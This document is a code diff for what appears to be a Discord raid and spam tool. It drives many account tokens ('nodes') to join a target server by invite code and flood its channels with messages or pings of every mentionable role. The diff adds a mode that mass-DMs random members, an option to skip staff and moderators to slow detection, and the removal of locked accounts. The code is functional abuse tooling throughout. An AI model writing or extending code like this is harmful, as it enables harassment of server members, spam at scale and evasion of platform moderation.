@@ -1,4 +1,4 @@
-import {Client, Guild, TextChannel, GuildChannel, Snowflake, Role, Permissions} from "discord.js";
+import {Client, Guild, TextChannel, GuildChannel, Snowflake, Role, Permissions, GuildMember, DMChannel, Collection} from "discord.js";
 import App, {AttackMode} from "./app";
 import Utils from "./utils";
 
@@ -51,12 +51,21 @@ export default class Worker {
             if (!this.nodes[i].guilds.has(this.app.options.TARGET_GUILD_ID)) {
                 // TODO: Use join timeout
                 this.app.log(`Joining @ ${this.nodes[i].user.tag}`);
-                await Utils.join(this.app.options.TARGET_GUILD_INVITE_CODE, this.nodes[i].token);
+
+                await Utils.join(this.app.options.TARGET_GUILD_INVITE_CODE, this.nodes[i].token).catch((error: Error) => {
+                    if (error.message === "Request failed with status code 403") {
+                        this.app.log(`Node may be locked ~> ${this.nodes[i].user.tag} (${this.nodes[i].user.id})`);
+                        this.dropNode(this.nodes[i]);
+                    }
+                    else {
+                        throw error;
+                    }
+                });
             }
         }
 
         if (this.nodes.length === 0) {
-            throw new Error("[Worker.prepare] No nodes could be prepared");
+            await this.endPrematurely("No nodes could be prepared");
         }
         else if (!this.guild) {
             this.guild = this.nodes[0].guilds.get(this.app.options.TARGET_GUILD_ID) as Guild;
@@ -64,6 +73,24 @@ export default class Worker {
         }
 
         return this;
+    }
+
+    private dropNode(node: Client): boolean {
+        const index: number = this.nodes.indexOf(node);
+
+        if (index !== -1) {
+            this.nodes.splice(index, 1);
+
+            return true;
+        }
+
+        return false;
+    }
+
+    private async endPrematurely(msg: string): Promise<void> {
+        this.app.log(`Ending prematurely: ${msg}`);
+        await this.cleanup();
+        process.exit(0);
     }
 
     private populateChannelCache(): this {
@@ -98,7 +125,7 @@ export default class Worker {
         const target: Snowflake = this.channelCache[Utils.getRandomInt(0, this.channelCache.length)].id;
 
         if (!node.channels.has(target)) {
-            this.app.log(`Node Down ~> ${node.user.tag} (${node.user.id})`);
+            this.app.log(`Node Down ~> ${node.user.tag} (${node.user.id}) [${this.nodes.length} up]`);
             this.nodes.splice(this.nodes.indexOf(node), 1);
 
             return null;
@@ -118,7 +145,7 @@ export default class Worker {
     }
 
     // TODO: Channels are bound to specific nodes
-    private getRandomNodeRandomChannel(): TextChannel | null {
+    private async getRandomNodeRandomChannel(): Promise<TextChannel | null> {
         let result: TextChannel | null = null;
 
         while (result === null && this.nodes.length > 0) {
@@ -126,7 +153,7 @@ export default class Worker {
         }
 
         if (this.nodes.length === 0) {
-            this.cleanup();
+            await this.cleanup();
         }
 
         return result;
@@ -137,24 +164,47 @@ export default class Worker {
         return true;
     }
 
+    private getGuildFor(node: Client): Guild | null {
+        return node.guilds.has(this.app.options.TARGET_GUILD_ID) ? node.guilds.get(this.app.options.TARGET_GUILD_ID) as Guild : null;
+    }
+
+    private getNextMember(): GuildMember | null {
+        const node: Client = this.getNextNode();
+        const guild: Guild | null = this.getGuildFor(node);
+
+        if (guild !== null) {
+            let members: Collection<Snowflake, GuildMember> = guild.members.clone();
+
+            if (this.app.options.MODE_AVOID_STAFF) {
+                members = members.filter((member: GuildMember) => {
+                    return member.id !== node.user.id && !Utils.hasModerationPowers(member);
+                });
+            }
+
+            return members.random();
+        }
+
+        return null;
+    }
+
     public start(): Promise<number> {
         let sent: number = 0;
 
-        if (this.app.options.MODE !== AttackMode.DMs && !this.guild) {
+        if (!this.guild) {
             throw new Error("[Worker.start] Expecting guild and channel");
         }
 
-        if (this.app.options.MODE === AttackMode.Random || this.app.options.MODE === AttackMode.RandomPings) {
+        if (this.app.options.MODE === AttackMode.Random || this.app.options.MODE === AttackMode.RandomPings || this.app.options.MODE === AttackMode.DMs) {
             return new Promise((resolve) => {
-                this.attackInterval = setInterval(() => {
+                this.attackInterval = setInterval(async () => {
                     if (!this.canContinue()) {
-                        this.cleanup();
+                        await this.cleanup();
                         resolve(sent);
 
                         return;
                     }
 
-                    this.sendPayload();
+                    await this.sendPayload();
                     sent += this.nodes.length;
                 }, this.app.options.MESSAGES_SEND_INTERVAL);
             });
@@ -164,46 +214,60 @@ export default class Worker {
         }
     }
 
-    private sendPayload(): this {
+    private async sendPayload(): Promise<this> {
         let payload: string = "Payload!";
 
-        switch (this.app.options.MODE) {
-            case AttackMode.Random: {
-                payload = this.app.messages[this.msgIterator];
-                this.msgIterator++;
+        // Determine payload
+        if (this.app.options.MODE === AttackMode.Random || this.app.options.MODE === AttackMode.DMs) {
+            payload = this.app.messages[this.msgIterator];
+            this.msgIterator++;
 
-                if (this.msgIterator >= this.app.messages.length) {
-                    this.msgIterator = 0;
-                }
-
-                break;
-            }
-
-            case AttackMode.RandomPings: {
-                if (!this.guild) {
-                    throw new Error("[Worker.sendPayload] Expecting guild");
-                }
-
-                // TODO: Avoid admins and cycle roles, also inefficient to loop through them every time
-                const mentionableRoles: Role[] = this.guild.roles.filter((role: Role) => role.mentionable).array();
-
-                // TODO: Should be done in the first client's load
-                if (mentionableRoles.length === 0) {
-                    throw new Error("[Worker.sendPayload] Target guild has no mentionable roles");
-                }
-
-                payload = mentionableRoles.map((role) => role.toString()).join(" ");
-
-                break;
-            }
-
-            default: {
-                throw new Error(`[Worker.sendPayload] Mode invalid or not supported: ${this.app.options.MODE}`);
+            if (this.msgIterator >= this.app.messages.length) {
+                this.msgIterator = 0;
             }
         }
+        else if (this.app.options.MODE === AttackMode.RandomPings) {
+            if (!this.guild) {
+                throw new Error("[Worker.sendPayload] Expecting guild");
+            }
 
+            // TODO: Avoid admins and cycle roles, also inefficient to loop through them every time
+            const mentionableRoles: Role[] = this.guild.roles.filter((role: Role) => role.mentionable).array();
+
+            // TODO: Should be done in the first client's load
+            if (mentionableRoles.length === 0) {
+                await this.endPrematurely("[Worker.sendPayload] Target guild has no mentionable roles");
+            }
+
+            payload = mentionableRoles.map((role) => role.toString()).join(" ");
+        }
+        else {
+            throw new Error(`[Worker.sendPayload] Mode invalid or not supported: ${this.app.options.MODE}`);
+        }
+
+        // DMs attack mode
+        if (this.app.options.MODE === AttackMode.DMs) {
+            const member: GuildMember | null = this.getNextMember();
+
+            if (member !== null) {
+                const dm: any = await member.createDM().catch((error: Error) => {
+                    if (error.message !== "Cannot send messages to this user") {
+                        throw error;
+                    }
+                });
+
+                // TODO: Remember user to avoid trying to send messages again in this session
+                if (dm) {
+                    dm.send(payload);
+                }
+            }
+
+            return this;
+        }
+
+        // Send payload
         for (let i: number = 0; i < this.nodes.length; i++) {
-            const channel: TextChannel | null = this.getRandomNodeRandomChannel();
+            const channel: TextChannel | null = await this.getRandomNodeRandomChannel();
             
             if (channel !== null) {
                 channel.send(payload).catch((error: Error) => {
@@ -218,13 +282,21 @@ export default class Worker {
         return this;
     }
 
-    private cleanup(): this {
+    private async cleanup(): Promise<this> {
         if (this.attackInterval) {
             clearInterval(this.attackInterval);
         }
 
         this.nodeIterator = 0;
         this.msgIterator = 0;
+
+        if (this.nodes.length > 0) {
+            for (let i: number = 0; i < this.nodes.length; i++) {
+                await this.nodes[i].destroy();
+            }
+        }
+
+        this.nodes = [];
 
         return this;
     }
